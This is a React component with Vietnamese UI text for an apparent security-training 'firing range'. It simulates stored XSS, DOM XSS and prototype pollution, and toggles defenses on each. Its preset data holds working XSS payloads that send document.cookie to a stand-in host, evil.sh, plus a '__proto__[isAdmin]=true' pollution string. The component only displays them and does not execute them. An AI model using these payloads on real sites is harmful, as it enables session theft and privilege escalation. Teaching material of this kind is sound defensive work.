'use client';

import * as React from 'react';
import {
  Braces,
  Link2,
  MessageSquare,
  RotateCcw,
  ShieldCheck,
  Skull,
} from 'lucide-react';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';

/**
 * FIRING RANGE · script-injection-range
 * Bãi bắn của tầng rendering: stored XSS cài payload vĩnh viễn vào mục bình
 * luận, DOM XSS bắn qua URL fragment vào sink innerHTML, và prototype
 * pollution đầu độc Object.prototype của cả runtime. Bật Defense để thấy
 * auto-escape + sanitize + Object.freeze vô hiệu hóa cả ba vector.
 */

type Tone = 'info' | 'ok' | 'bad' | 'warn';

interface LogLine {
  id: number;
  text: string;
  tone: Tone;
}

interface FakeComment {
  id: number;
  author: string;
  text: string;
  /** true = payload ĐÃ "thực thi" trong máy nạn nhân (chỉ khi sanitizer tắt) */
  executed: boolean;
}

type TabId = 'stored' | 'dom' | 'proto';

const SEED_COMMENTS: FakeComment[] = [
  {
    id: 1,
    author: 'minh_dev',
    text: 'Bài viết chi tiết quá, cảm ơn tác giả!',
    executed: false,
  },
  { id: 2, author: 'hang.nguyen', text: 'Đã bookmark, mai đọc tiếp.', executed: false },
];

const PAYLOAD_PRESETS: Array<{ id: string; label: string; code: string }> = [
  {
    id: 'img',
    label: '<img src=x onerror=…>',
    code: `<img src=x onerror="fetch('https://evil.sh/collect?c='+document.cookie)">`,
  },
  {
    id: 'svg',
    label: '<svg onload=…>',
    code: `<svg onload="alert(document.domain)"></svg>`,
  },
  {
    id: 'script',
    label: '<script>…</script>',
    code: `<script>fetch('https://evil.sh/log', { method: 'POST', body: document.cookie })</script>`,
  },
];

const LOOKS_LIKE_PAYLOAD = /<\/?[a-z][^>]*>|on[a-z]+\s*=/i;

const DEFAULT_HASH = '#profile&name=<img src=x onerror=steal()>';
const BENIGN_HASH = '#profile&name=<b>An Nguyễn</b>';
const DEFAULT_QS = '?__proto__[isAdmin]=true';

function escapeHtml(input: string): string {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function parseHashName(hash: string): string {
  const match = hash.match(/name=([^&]*)/);
  if (!match) return '';
  try {
    return decodeURIComponent(match[1]);
  } catch {
    return match[1];
  }
}

const TABS: Array<{ id: TabId; label: string; icon: React.ReactNode }> = [
  { id: 'stored', label: 'Stored XSS', icon: <MessageSquare className="h-3.5 w-3.5" /> },
  { id: 'dom', label: 'DOM XSS · URL fragment', icon: <Link2 className="h-3.5 w-3.5" /> },
  { id: 'proto', label: 'Prototype Pollution', icon: <Braces className="h-3.5 w-3.5" /> },
];

export function XssInjectionRange() {
  const [defenseMode, setDefenseMode] = React.useState(false);
  const [activeTab, setActiveTab] = React.useState<TabId>('stored');

  // ── Stored XSS ────────────────────────────────────────────────────────────
  const [comments, setComments] = React.useState<FakeComment[]>(SEED_COMMENTS);
  const [draft, setDraft] = React.useState('');
  const [alertBanner, setAlertBanner] = React.useState<string | null>(null);
  const bannerTimerRef = React.useRef<number | null>(null);

  // ── DOM XSS ───────────────────────────────────────────────────────────────
  const [hashInput, setHashInput] = React.useState(DEFAULT_HASH);
  const [domRaw, setDomRaw] = React.useState<string | null>(null);
  const [domLogs, setDomLogs] = React.useState<LogLine[]>([]);

  // ── Prototype pollution ───────────────────────────────────────────────────
  const [queryString, setQueryString] = React.useState(DEFAULT_QS);
  const [polluted, setPolluted] = React.useState(false);
  const [protoLogs, setProtoLogs] = React.useState<LogLine[]>([]);

  // ── Hits theo vector ──────────────────────────────────────────────────────
  const [hits, setHits] = React.useState({ stored: false, dom: false, proto: false });

  const logIdRef = React.useRef(0);
  const makeLines = (entries: Array<[string, Tone]>): LogLine[] =>
    entries.map(([text, tone]) => ({ id: ++logIdRef.current, text, tone }));

  React.useEffect(() => {
    return () => {
      if (bannerTimerRef.current) window.clearTimeout(bannerTimerRef.current);
    };
  }, []);

  const hitCount = (hits.stored ? 1 : 0) + (hits.dom ? 1 : 0) + (hits.proto ? 1 : 0);

  const flashBanner = (message: string) => {
    if (bannerTimerRef.current) window.clearTimeout(bannerTimerRef.current);
    setAlertBanner(message);
    bannerTimerRef.current = window.setTimeout(() => setAlertBanner(null), 2800);
  };

  const postComment = () => {
    const text = draft.trim();
    if (!text) return;
    const dangerous = !defenseMode && LOOKS_LIKE_PAYLOAD.test(text);
    if (dangerous) {
      setHits((prev) => ({ ...prev, stored: true }));
      flashBanner(
        '⚠️ alert() từ payload — mã đã thực thi trong trình duyệt của MỌI user mở trang này!'
      );
    }
    setComments((prev) => [
      ...prev,
      { id: prev.length + 3, author: 'attacker', text, executed: dangerous },
    ]);
    setDraft('');
  };

  const openCraftedLink = () => {
    const raw = parseHashName(hashInput);
    setDomRaw(raw);
    if (defenseMode) {
      setDomLogs((prev) =>
        [
          ...prev,
          ...makeLines([
            [`$ navigate → /profile${hashInput}`, 'info'],
            [
              '[sink:textContent] chuỗi render NGUYÊN VĂN — parser HTML không chạm vào',
              'ok',
            ],
            ['→ không có element nào được tạo, onerror/onload vô hiệu ✅', 'ok'],
          ]),
        ].slice(-9)
      );
      return;
    }
    const dangerous = /<(img|svg|script|iframe)\b|on(error|load)\s*=/i.test(raw);
    setDomLogs((prev) =>
      [
        ...prev,
        ...makeLines([
          [`$ navigate → /profile${hashInput}`, 'info'],
          ['[sink:innerHTML] chuỗi được parser xử lý như MARKUP THẬT', 'bad'],
          ...(dangerous
            ? ([
                [`element lạ được tạo → event handler FIRED`, 'bad'],
                [
                  `fetch('https://evil.sh/c?' + document.cookie) → 🍪 COOKIE STOLEN`,
                  'bad',
                ],
              ] as Array<[string, Tone]>)
            : ([[`thẻ hợp lệ được parse — raw HTML pipeline xác nhận`, 'warn']] as Array<
                [string, Tone]
              >)),
        ]),
      ].slice(-9)
    );
    if (dangerous) setHits((prev) => ({ ...prev, dom: true }));
  };

  const runDeepMerge = () => {
    if (defenseMode) {
      setPolluted(false);
      setProtoLogs((prev) =>
        [
          ...prev,
          ...makeLines([
            [`$ deepMerge(config, parseQuery('${queryString}'))`, 'info'],
            [
              'config là Map + Object.freeze(Object.prototype) → ghi __proto__ bị BỎ QUA',
              'ok',
            ],
            ['Object.prototype giữ nguyên vẹn — pollution THẤT BẠI ✅', 'ok'],
          ]),
        ].slice(-9)
      );
      return;
    }
    setPolluted(true);
    setHits((prev) => ({ ...prev, proto: true }));
    setProtoLogs((prev) =>
      [
        ...prev,
        ...makeLines([
          [`$ deepMerge(config, parseQuery('${queryString}'))`, 'info'],
          ['recursive merge ghi key "__proto__" thẳng vào Object.prototype', 'bad'],
          ['Object.prototype.isAdmin === true → TOÀN BỘ runtime bị nhiễm', 'bad'],
          ['user.isAdmin trả về true mà KHÔNG cần đăng nhập 💀', 'bad'],
        ]),
      ].slice(-9)
    );
  };

  const resetRange = () => {
    setComments(SEED_COMMENTS);
    setDraft('');
    setAlertBanner(null);
    setHashInput(DEFAULT_HASH);
    setDomRaw(null);
    setDomLogs([]);
    setQueryString(DEFAULT_QS);
    setPolluted(false);
    setProtoLogs([]);
    setHits({ stored: false, dom: false, proto: false });
  };

  const renderSinkPreview = () => {
    if (domRaw === null) {
      return (
        <div className="animate-pulse text-slate-600">
          $ chưa có navigation — craft URL rồi bấm &quot;Mở link&quot;…
        </div>
      );
    }
    if (defenseMode) {
      return (
        <div className="space-y-1">
          <div className="rounded-md bg-slate-900/70 px-2 py-1.5 text-slate-300">
            {domRaw}
          </div>
          <p className="text-[10px] tracking-wider text-emerald-500 uppercase">
            textContent · hiển thị nguyên văn, không parse
          </p>
        </div>
      );
    }
    const dangerous = /<(img|svg|script|iframe)\b|on(error|load)\s*=/i.test(domRaw);
    if (dangerous) {
      const tags = Array.from(new Set(domRaw.match(/<\/?[a-zA-Z]+/g) ?? []).values()).map(
        (t) => t.replace('</', '')
      );
      return (
        <div className="space-y-1">
          <div className="flex flex-wrap items-center gap-1.5 rounded-md bg-red-500/15 px-2 py-1.5 text-red-300">
            <span className="animate-pulse">🖼️💥</span>
            <span className="font-bold">EXECUTED:</span>
            <span>{tags.join(' · ') || 'markup'} được chèn thật vào DOM</span>
          </div>
          <p className="text-[10px] text-red-400">
            event handler chạy ngay trong trình duyệt nạn nhân — cookie đã rời đi.
          </p>
        </div>
      );
    }
    const inner = domRaw.replace(/<\/?[a-zA-Z][^>]*>/g, '');
    return (
      <div className="space-y-1">
        <div className="rounded-md bg-slate-900/70 px-2 py-1.5 font-bold text-slate-100">
          {inner}
        </div>
        <p className="text-[10px] tracking-wider text-amber-500 uppercase">
          innerHTML · thẻ được parse THẬT (lần này chỉ là &lt;b&gt; — pipeline vẫn nguy
          hiểm)
        </p>
      </div>
    );
  };

  return (
    <div className="space-y-4">
      {/* Control bar */}
      <div className="flex flex-wrap items-center justify-between gap-2">
        <div className="flex items-center gap-2">
          {defenseMode ? (
            <Badge variant="success" className="gap-1 text-[10px]">
              <ShieldCheck className="h-3 w-3" />
              DEFENSE ON
            </Badge>
          ) : (
            <Badge variant="destructive" className="gap-1 text-[10px]">
              <Skull className="h-3 w-3" />
              ATTACK MODE
            </Badge>
          )}
          <span className="text-muted-foreground font-mono text-[10px] tracking-wider uppercase">
            đã khai hoả {hitCount}/3 vector chèn mã
          </span>
        </div>
        <div className="flex gap-2">
          <Button
            size="sm"
            variant={defenseMode ? 'ghost' : 'destructive'}
            onClick={() => setDefenseMode(false)}
            className="h-7 text-[11px]"
          >
            <Skull className="mr-1 h-3 w-3" />
            Gỡ sanitizer
          </Button>
          <Button
            size="sm"
            variant={defenseMode ? 'default' : 'ghost'}
            onClick={() => setDefenseMode(true)}
            className="h-7 text-[11px]"
          >
            <ShieldCheck className="mr-1 h-3 w-3" />
            Sanitize + freeze
          </Button>
          <Button
            size="sm"
            variant="ghost"
            onClick={resetRange}
            className="h-7 px-2 text-[11px]"
          >
            <RotateCcw className="mr-1 h-3 w-3" />
            Reset
          </Button>
        </div>
      </div>

      {/* Tab-like switcher */}
      <div className="border-border/80 bg-card flex w-fit gap-1 rounded-xl border p-1">
        {TABS.map((tab) => (
          <button
            key={tab.id}
            type="button"
            onClick={() => setActiveTab(tab.id)}
            className={`flex items-center gap-1.5 rounded-lg px-3 py-1.5 text-[11px] font-semibold transition-colors ${
              activeTab === tab.id
                ? 'bg-slate-800 text-slate-100 shadow-inner'
                : 'text-muted-foreground hover:bg-accent hover:text-accent-foreground'
            }`}
          >
            {tab.icon}
            {tab.label}
          </button>
        ))}
      </div>

      {/* ── Stored XSS mini-range ── */}
      {activeTab === 'stored' && (
        <div className="relative space-y-3 rounded-xl border border-slate-800 bg-slate-950 p-3 shadow-inner">
          {alertBanner && (
            <div className="pointer-events-none absolute top-6 left-1/2 z-10 w-[90%] -translate-x-1/2 -rotate-1 rounded-lg border border-amber-400/50 bg-amber-950/95 px-4 py-2 text-center font-mono text-[11px] font-bold text-amber-300 shadow-xl">
              {alertBanner}
            </div>
          )}
          <div className="flex items-center justify-between font-mono text-[11px] text-slate-500">
            <span>$ GET /post/123/comments</span>
            <Badge
              variant={defenseMode ? 'success' : 'destructive'}
              className="text-[9px]"
            >
              {defenseMode ? 'render: auto-escaping' : 'render: dangerouslySetInnerHTML'}
            </Badge>
          </div>

          <div className="space-y-1.5">
            {comments.map((comment) => (
              <div
                key={comment.id}
                className={`rounded-lg border-l-2 px-2.5 py-1.5 ${
                  comment.executed
                    ? 'border-destructive bg-red-500/15'
                    : comment.author === 'attacker'
                      ? 'border-emerald-500/60 bg-emerald-500/5'
                      : 'border-slate-700 bg-slate-900/50'
                }`}
              >
                <div className="mb-0.5 flex items-center gap-2">
                  <span className="font-mono text-[10px] text-slate-500">
                    @{comment.author}
                  </span>
                  {comment.executed && (
                    <Badge
                      variant="destructive"
                      className="animate-pulse gap-1 text-[9px]"
                    >
                      ⚡ EXECUTED payload
                    </Badge>
                  )}
                  {!comment.executed && comment.author === 'attacker' && defenseMode && (
                    <Badge variant="success" className="text-[9px]">
                      ESCAPED
                    </Badge>
                  )}
                </div>
                {comment.executed ? (
                  <p className="font-mono text-[11px] leading-relaxed text-red-300">
                    {comment.text}
                    <span className="mt-1 block text-[10px] text-red-400/80">
                      → onerror/onload FIRED · fetch(&apos;https://evil.sh/collect&apos;)
                      · document.cookie rời máy nạn nhân
                    </span>
                  </p>
                ) : comment.author === 'attacker' && defenseMode ? (
                  <p className="font-mono text-[11px] leading-relaxed break-all text-emerald-300/90">
                    {escapeHtml(comment.text)}
                  </p>
                ) : (
                  <p className="text-[11px] leading-relaxed text-slate-300">
                    {comment.text}
                  </p>
                )}
              </div>
            ))}
          </div>

          <div className="flex flex-wrap items-center gap-1.5 pt-1">
            {PAYLOAD_PRESETS.map((preset) => (
              <button
                key={preset.id}
                type="button"
                onClick={() => setDraft(preset.code)}
                title={preset.code}
                disabled={defenseMode}
                className={`rounded-md border px-2 py-1 font-mono text-[10px] transition-colors ${
                  defenseMode
                    ? 'cursor-not-allowed border-slate-800 text-slate-600'
                    : 'border-red-500/30 bg-red-500/10 text-red-300 hover:bg-red-500/25'
                }`}
              >
                {preset.label}
              </button>
            ))}
          </div>
          <div className="flex gap-2">
            <Input
              value={draft}
              onChange={(e) => setDraft(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && postComment()}
              placeholder="Viết bình luận… hoặc chọn payload ở trên"
              className="h-8 border-slate-700 bg-slate-900/70 font-mono text-[11px] text-slate-200 placeholder:text-slate-600"
            />
            <Button
              size="sm"
              variant={defenseMode ? 'default' : 'destructive'}
              onClick={postComment}
              className="h-8 shrink-0 text-[11px]"
            >
              Đăng bình luận
            </Button>
          </div>
          <p className="font-mono text-[10px] text-slate-600">
            {defenseMode
              ? '// sanitizer ON: mọi markup được escape thành text node (&lt;img&gt;…) — payload chết ngay khi render'
              : '// sanitizer OFF: comment render bằng dangerouslySetInnerHTML — payload sống sót vào DB và tái phát mỗi pageview'}
          </p>
        </div>
      )}

      {/* ── DOM XSS mini-range ── */}
      {activeTab === 'dom' && (
        <div className="space-y-3 rounded-xl border border-slate-800 bg-slate-950 p-3 shadow-inner">
          <div className="flex items-center justify-between font-mono text-[11px] text-slate-500">
            <span>$ craft link gửi nạn nhân…</span>
            <Badge
              variant={defenseMode ? 'success' : 'destructive'}
              className="text-[9px]"
            >
              sink: {defenseMode ? 'textContent' : 'element.innerHTML'}
            </Badge>
          </div>

          <div className="flex items-stretch gap-2">
            <span className="flex items-center rounded-lg border border-slate-700 bg-slate-900/70 px-2 font-mono text-[10px] text-slate-500">
              https://app.example.com/profile
            </span>
            <Input
              value={hashInput}
              onChange={(e) => setHashInput(e.target.value)}
              className="h-8 border-slate-700 bg-slate-900/70 font-mono text-[11px] text-slate-200"
            />
          </div>
          <div className="flex flex-wrap items-center gap-1.5">
            <button
              type="button"
              onClick={() => setHashInput(BENIGN_HASH)}
              className="rounded-md border border-slate-700 px-2 py-1 font-mono text-[10px] text-slate-400 hover:bg-slate-800"
            >
              benign: &lt;b&gt;An&lt;/b&gt;
            </button>
            <button
              type="button"
              onClick={() => setHashInput(DEFAULT_HASH)}
              disabled={defenseMode}
              className={`rounded-md border px-2 py-1 font-mono text-[10px] transition-colors ${
                defenseMode
                  ? 'cursor-not-allowed border-slate-800 text-slate-600'
                  : 'border-red-500/30 bg-red-500/10 text-red-300 hover:bg-red-500/25'
              }`}
            >
              malicious: &lt;img src=x onerror=steal()&gt;
            </button>
            <Button
              size="sm"
              variant={defenseMode ? 'default' : 'destructive'}
              onClick={openCraftedLink}
              className="ml-auto h-8 text-[11px]"
            >
              Mở link (nạn nhân click)
            </Button>
          </div>

          <div className="rounded-lg border border-slate-800 bg-black/40 p-2.5">
            <p className="mb-1 font-mono text-[10px] tracking-wider text-slate-600 uppercase">
              kết quả render sink:
            </p>
            {renderSinkPreview()}
          </div>

          {domLogs.length > 0 && (
            <div className="rounded-lg bg-black/40 p-2.5 font-mono text-[11px] leading-relaxed">
              {domLogs.map((line) => (
                <div
                  key={line.id}
                  className={
                    line.tone === 'bad'
                      ? 'text-red-400'
                      : line.tone === 'ok'
                        ? 'text-emerald-400'
                        : line.tone === 'warn'
                          ? 'text-amber-400'
                          : 'text-slate-500'
                  }
                >
                  {line.text}
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* ── Prototype pollution mini-range ── */}
      {activeTab === 'proto' && (
        <div className="space-y-3 rounded-xl border border-slate-800 bg-slate-950 p-3 shadow-inner">
          <div className="flex items-center justify-between font-mono text-[11px] text-slate-500">
            <span>$ query-string editor → deepMerge(config, params)</span>
            <Badge
              variant={polluted ? 'destructive' : 'secondary'}
              className="text-[9px]"
            >
              {polluted
                ? 'PROTOTYPE INFECTED'
                : defenseMode
                  ? 'prototype frozen'
                  : 'prototype sạch'}
            </Badge>
          </div>

          <div className="flex items-stretch gap-2">
            <Input
              value={queryString}
              onChange={(e) => setQueryString(e.target.value)}
              className="h-8 border-slate-700 bg-slate-900/70 font-mono text-[11px] text-slate-200"
            />
            <Button
              size="sm"
              variant={defenseMode ? 'default' : 'destructive'}
              onClick={runDeepMerge}
              className="h-8 shrink-0 text-[11px]"
            >
              Chạy deepMerge
            </Button>
          </div>

          {/* Mock app chrome */}
          <div className="overflow-hidden rounded-lg border border-slate-800">
            <div className="flex items-center gap-2 border-b border-slate-800 bg-slate-900/80 px-3 py-1.5">
              <span className="text-[11px] font-bold text-slate-200">MyApp</span>
              <span className="font-mono text-[10px] text-slate-500">/dashboard</span>
              <span className="ml-auto">
                {polluted ? (
                  <Badge variant="warning" className="animate-pulse text-[9px]">
                    👑 ADMIN (polluted!)
                  </Badge>
                ) : (
                  <Badge variant="secondary" className="text-[9px]">
                    user thường
                  </Badge>
                )}
              </span>
            </div>
            <div className="bg-slate-950 p-3">
              {polluted ? (
                <div className="space-y-1.5 rounded-md border border-amber-500/40 bg-amber-500/10 p-2.5">
                  <p className="font-mono text-[11px] font-bold text-amber-300">
                    ⚙️ Bảng điều khiển Admin — unlocked bởi pollution
                  </p>
                  <p className="font-mono text-[10px] text-amber-400/80">
                    user.isAdmin === true mà không hề đăng nhập · Xóa user · Xuất DB · Đổi
                    role
                  </p>
                </div>
              ) : (
                <p className="font-mono text-[10px] text-slate-600">
                  {defenseMode
                    ? '// settings panel bị khóa — config dùng Map + prototype frozen'
                    : '// settings panel ẩn — chỉ role admin thật mới thấy'}
                </p>
              )}
            </div>
          </div>

          {protoLogs.length > 0 && (
            <div className="rounded-lg bg-black/40 p-2.5 font-mono text-[11px] leading-relaxed">
              {protoLogs.map((line) => (
                <div
                  key={line.id}
                  className={
                    line.tone === 'bad'
                      ? 'text-red-400'
                      : line.tone === 'ok'
                        ? 'text-emerald-400'
                        : 'text-slate-500'
                  }
                >
                  {line.text}
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* Per-vector report */}
      <div className="space-y-2">
        {(
          [
            {
              key: 'stored' as const,
              icon: <MessageSquare className="h-3.5 w-3.5" />,
              label: 'Stored XSS qua bình luận',
              hitNote:
                'Payload nằm trong DB, tự khởi động trong trình duyệt của mọi user mở trang — kể cả admin.',
              patchNote:
                'Auto-escape biến payload thành text node; nếu buộc render HTML thì DOMPurify whitelist + CSP làm lớp đạn cuối.',
            },
            {
              key: 'dom' as const,
              icon: <Link2 className="h-3.5 w-3.5" />,
              label: 'DOM XSS qua URL fragment',
              hitNote:
                'Fragment đi thẳng vào sink innerHTML — attacker chỉ cần một link, không phải lưu gì lên server.',
              patchNote:
                'Đổi sink sang textContent: fragment luôn là chuỗi nguyên văn, parser HTML không bao giờ chạm vào.',
            },
            {
              key: 'proto' as const,
              icon: <Braces className="h-3.5 w-3.5" />,
              label: 'Prototype pollution qua query string',
              hitNote:
                'deepMerge ghi __proto__ vào Object.prototype — mọi object trong runtime cùng lúc mang thuộc tính giả mạo.',
              patchNote:
                'Object.freeze(Object.prototype) + config Map-based: key __proto__ bị bỏ qua một cách âm thầm và an toàn.',
            },
          ] as Array<{
            key: 'stored' | 'dom' | 'proto';
            icon: React.ReactNode;
            label: string;
            hitNote: string;
            patchNote: string;
          }>
        ).map((vector) => {
          const hit = !defenseMode && hits[vector.key];
          const patched = defenseMode;
          return (
            <Card
              key={vector.key}
              className={`glass-card flex items-start gap-3 p-3 ${
                hit ? 'border-destructive/30' : patched ? 'border-emerald-500/20' : ''
              }`}
            >
              <span
                className={`mt-0.5 flex h-7 w-7 shrink-0 items-center justify-center rounded-lg ${
                  hit
                    ? 'bg-destructive/10 text-destructive'
                    : patched
                      ? 'bg-emerald-500/10 text-emerald-500'
                      : 'bg-secondary text-muted-foreground'
                }`}
              >
                {hit ? (
                  <Skull className="h-3.5 w-3.5" />
                ) : patched ? (
                  <ShieldCheck className="h-3.5 w-3.5" />
                ) : (
                  vector.icon
                )}
              </span>
              <div className="min-w-0 space-y-0.5">
                <p className="text-foreground text-xs font-bold">{vector.label}</p>
                {hit && (
                  <p className="text-destructive text-[11px] leading-relaxed">
                    {vector.hitNote}
                  </p>
                )}
                {patched && (
                  <p className="text-[11px] leading-relaxed text-emerald-600 dark:text-emerald-400">
                    {vector.patchNote}
                  </p>
                )}
                {!hit && !patched && (
                  <p className="text-muted-foreground text-[11px] leading-relaxed">
                    Chưa khai hoả — bắn vector này ở ATTACK MODE để xem Blast Radius.
                  </p>
                )}
              </div>
            </Card>
          );
        })}
      </div>

      {/* Verdict */}
      {(hitCount > 0 || defenseMode) && (
        <Card
          className={`glass-card p-4 ${defenseMode ? 'border-emerald-500/30' : 'border-destructive/30'}`}
        >
          {hitCount > 0 && !defenseMode ? (
            <p className="text-foreground text-xs leading-relaxed">
              💀 <span className="font-bold">Blast Radius:</span> payload stored tái phát
              với mọi pageview, một crafted link đủ bắn DOM XSS không cần lưu dấu vết, và
              pollution biến toàn bộ object runtime thành ranh giới tin cậy sụp đổ —
              cookie bay về evil.sh trong khi hệ thống vẫn nghĩ mọi thứ bình thường.
            </p>
          ) : (
            <p className="text-foreground text-xs leading-relaxed">
              🛡️{' '}
              <span className="font-bold text-emerald-600 dark:text-emerald-400">
                Defense Patch:
              </span>{' '}
              auto-escape chặn stored/DOM payload ở tầng text node, DOMPurify whitelist
              cho trường hợp buộc render HTML, Object.freeze + Map-based config đóng cửa
              prototype — cả ba vector chuyển trạng thái PATCHED.
            </p>
          )}
        </Card>
      )}
    </div>
  );
}
